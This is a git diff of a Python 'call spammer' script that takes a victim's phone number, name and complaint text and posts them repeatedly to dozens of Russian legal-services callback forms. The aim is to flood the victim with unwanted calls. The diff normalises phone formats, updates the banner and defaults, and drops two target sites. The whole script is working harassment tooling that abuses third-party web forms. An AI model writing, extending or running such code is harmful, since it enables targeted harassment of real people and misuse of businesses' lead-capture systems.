@@ -3,13 +3,14 @@
 # Author: FSystem88
 class callspam:
 	def main(self):
-		print('8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888  Call Spammer!  8888\n8888      v.0.4      8888\n8888    beta test    8888\n8888888888888888888888888\n8888888888888888888888888\n')
 		import requests, random, datetime, sys, time, argparse
 		from colorama import Fore, Back, Style
-		parser = argparse.ArgumentParser(prog='callspam', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой номер: +79153509908 (Москва) или e-mail - FSystem88@bk.ru')
-		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79153509908)')
+		print(Fore.GREEN + '8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888  Call Spammer!  8888\n8888      v.1.0      8888\n8888888888888888888888888\n8888888888888888888888888\n')
+		print(Style.RESET_ALL)
+		parser = argparse.ArgumentParser(prog='callspam', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='E-mail - FSystem88@bk.ru')
+		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79991231122)')
 		parser.add_argument('--name', help='Имя жертвы (по умолчанию: Саша)')
-		parser.add_argument('--text', help='Текст с жалобой (по умолчанию: Деление имущества после смерти родителей)')
+		parser.add_argument('--text', help='Текст с жалобой (по умолчанию: сомнительная компания вымогает деньги)')
 		args = parser.parse_args()
 		def showstatus(message, type='new'):
 			now = datetime.datetime.now().strftime('%H:%M:%S')
@@ -34,6 +35,12 @@ class callspam:
 		_name = args.name
 		_text = args.text
 		_phone = args.phonenum
+		if _phone[0] == '+':
+			_phone = _phone[1:]
+		if _phone[0] == '8':
+			_phone = '7'+_phone[1:]
+		if _phone[0] == '9':
+			_phone = '7'+_phone
 		_email = ''
 		for x in range(12):
 			_email = _email + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
@@ -41,7 +48,7 @@ class callspam:
 		_phoneBukvaprava = _phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '7(777)777-77-77'
 		
 		if _name == None:
-			_name = 'Антон'
+			_name = 'Саша'
 		if _text == None:
 			_text = 'сомнительная компания вымогает деньги'
 
@@ -79,16 +86,12 @@ class callspam:
 				print(Fore.GREEN + 'юрист-авгрупп.рф: отправлено')
 			else:
 				print(Fore.RED + 'юрист-авгрупп.рф: не отправлено')
-			gosur = requests.post('https://www.gos-ur.ru/zayavka/', data={'name': _name,'phone': _phone[4:11],'question': _text,'code':_phone[1:4],'type':'exit'})
-			if gosur.status_code == 200:
-				print(Fore.GREEN + 'www.gos-ur.ru: отправлено')
-			else:
-				print(Fore.RED + 'www.gos-ur.ru: не отправлено')
 			nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''})
 			if nicecream.status_code == 200:
 				print(Fore.GREEN + 'nice-cream.ru: отправлено')
 			else:
 				print(Fore.RED + 'nice-cream.ru: не отправлено')
+			
 			rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:4]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'})
 			if rossovet.status_code == 200:
 				print(Fore.GREEN + 'rossovet.ru: отправлено')
@@ -144,11 +147,6 @@ class callspam:
 				print(Fore.GREEN + 'pravo-sfera.ru: отправлено')
 			else:
 				print(Fore.RED + 'pravo-sfera.ru: не отправлено')
-			dfghjkrfv = requests.post('http://xn----8sbf5ajmeav8b.xn--p1ai/', data={'number': _phone, 'name': _name, 'comment': _text, 'ip': '188.128.10.212', 'system': 'text'})
-			if dfghjkrfv.status_code == 200:
-				print(Fore.GREEN + 'цпп-москва.рф: отправлено')
-			else:
-				print(Fore.RED + 'цпп-москва.рф: не отправлено')
 			uristexpert24 = requests.post('https://urist-expert24.ru/send-lead/', data={'name': _name, 'phone': _phoneVodaonline, 'form-name': 'Заказ обратного звонка'})
 			if uristexpert24.status_code == 200:
 				print(Fore.GREEN + 'urist-expert24.ru: отправлено')
@@ -171,5 +169,6 @@ class callspam:
 				print(Fore.RED + '9911030.ru: не отправлено')
 
 			print('Готово!')
+			print(Style.RESET_ALL)
 spammer = callspam()
 spammer.main()
